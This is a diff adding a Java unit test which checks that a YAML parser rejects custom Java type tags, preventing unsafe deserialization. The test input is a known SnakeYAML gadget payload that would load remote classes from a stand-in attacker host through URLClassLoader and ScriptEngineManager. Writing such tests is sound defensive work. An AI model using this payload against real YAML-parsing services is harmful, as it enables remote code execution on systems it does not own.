@@ -280,6 +280,19 @@ public class RecordingScopeParserTest {
   }
 
   /**
+   * Verifies that YAML containing a custom Java type tag is rejected by SafeConstructor, preventing
+   * arbitrary object deserialization.
+   */
+  @Test(expected = IllegalArgumentException.class)
+  public void rejectsYamlWithCustomJavaTypeTags() {
+    String malicious =
+        "defaultAction: !!javax.script.ScriptEngineManager"
+            + " [!!java.net.URLClassLoader"
+            + " [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
+    RecordingScopeParser.parseYaml(malicious);
+  }
+
+  /**
    * Verifies that a YAML rule with a {@code categories} list (e.g. {@code [FIELD_GET, FIELD_SET]})
    * is parsed into a {@link RecordingScopeRule} with the correct {@link
    * io.quasient.pal.core.rpc.policy.MemberCategory} set.
